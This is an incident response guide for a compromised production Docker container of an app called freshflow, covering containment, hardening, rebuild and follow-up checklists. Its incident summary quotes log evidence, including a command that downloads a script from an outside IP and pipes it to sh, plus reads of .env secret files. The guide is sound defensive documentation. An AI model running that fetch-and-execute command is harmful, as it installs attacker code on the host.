# 🚨 Security Incident Response Guide

## Critical Security Issue Detected

**Date:** Current  
**Status:** ACTIVE INCIDENT  
**Severity:** CRITICAL

## Incident Summary

Docker logs show malicious shell commands being executed in the production container:

- `wget http://172.237.55.180/c -O-|sh` - Downloading and executing malicious scripts
- `wget http://89.144.31.18` - Connecting to suspicious IP addresses
- Attempts to create files in `/dev/` directory
- Multiple `spawnSync /bin/sh` errors indicating shell command execution

Additionally, errors show attempts to read `.env*` files using `cat` command, which suggests:
1. Missing environment files in container
2. Possible code trying to read env files via shell commands (security risk)

## Immediate Actions Required

### 1. STOP THE CONTAINER IMMEDIATELY

```bash
docker stop freshflow
docker rm freshflow
```

### 2. Isolate the System

- Disconnect the server from the network if possible
- Take a snapshot/backup of the current state for forensic analysis
- Document all suspicious activity

### 3. Assess the Damage

Check for:
- Unauthorized file modifications
- New user accounts
- Database modifications
- Network connections to suspicious IPs
- Modified environment variables

### 4. Security Hardening Applied

The following security measures have been implemented:

#### A. Input Sanitization (`src/lib/security.ts`)
- Sanitizes all user inputs
- Blocks shell command patterns
- Validates email and URL formats
- Rate limiting protection

#### B. Security Middleware (`src/middleware.ts`)
- Adds security headers to all responses
- Rate limiting for API routes (100 requests/minute per IP)
- Validates query parameters for malicious input
- Blocks suspicious patterns

#### C. Enhanced JSON Parsing
- Added validation to Gemini JSON parsing to prevent code injection
- Error handling for malformed JSON

### 5. Fix Environment File Issue

The `.env*` file reading errors suggest:
1. Environment files are not being mounted correctly in Docker
2. Some code (possibly in a dependency) is trying to read env files via shell

**Solution:**
- Ensure `.env.production` file exists on the server
- Mount it properly in Docker using `--env-file` flag
- Never use shell commands to read env files - use `process.env` instead

### 6. Rebuild and Redeploy

```bash
# 1. Review all dependencies for vulnerabilities
npm audit
npm audit fix

# 2. Rebuild the Docker image
docker build -t freshflow:secure .

# 3. Run with proper environment file
docker run -d \
  --name freshflow \
  --restart unless-stopped \
  -p 3000:3000 \
  --env-file /path/to/.env.production \
  freshflow:secure
```

## Security Best Practices Implemented

### Input Validation
- All user inputs are sanitized
- Shell command patterns are blocked
- XSS patterns are filtered
- Path traversal attempts are prevented

### Rate Limiting
- API routes: 100 requests/minute per IP
- Prevents brute force and DDoS attacks

### Security Headers
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy` restrictions

### Code Injection Prevention
- No `eval()` or `Function()` usage
- JSON parsing with validation
- No shell command execution from user input
- Sanitized object processing

## Investigation Checklist

- [ ] Review all API endpoints for injection vulnerabilities
- [ ] Check database for unauthorized modifications
- [ ] Review access logs for suspicious IPs
- [ ] Check for new files created by attacker
- [ ] Review all environment variables
- [ ] Check for modified source code
- [ ] Review dependency versions for known vulnerabilities
- [ ] Check for unauthorized user accounts
- [ ] Review file permissions

## Prevention Measures

### 1. Regular Security Audits
```bash
npm audit
npm audit fix
```

### 2. Dependency Updates
Keep all dependencies up to date:
```bash
npm update
```

### 3. Environment Variable Security
- Never commit `.env` files to git
- Use Docker secrets or environment variables
- Rotate secrets regularly
- Use strong, unique secrets

### 4. Monitoring
- Set up log monitoring for suspicious patterns
- Monitor for unusual network traffic
- Set up alerts for security events

### 5. Access Control
- Use strong passwords
- Enable 2FA where possible
- Limit admin access
- Regular access reviews

## Post-Incident Actions

1. **Document the Incident**
   - Timeline of events
   - Attack vectors identified
   - Damage assessment
   - Remediation steps taken

2. **Update Security Policies**
   - Review and update security procedures
   - Implement additional safeguards
   - Train team on security best practices

3. **Notify Stakeholders**
   - Inform users if data was compromised
   - Report to relevant authorities if required
   - Update security documentation

4. **Continuous Monitoring**
   - Set up automated security scanning
   - Regular penetration testing
   - Security code reviews

## Emergency Contacts

- **Security Team:** [Add contact]
- **DevOps Team:** [Add contact]
- **Management:** [Add contact]

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Docker Security](https://docs.docker.com/engine/security/)

---

**⚠️ IMPORTANT:** This is an active security incident. Follow the immediate actions above before resuming normal operations.

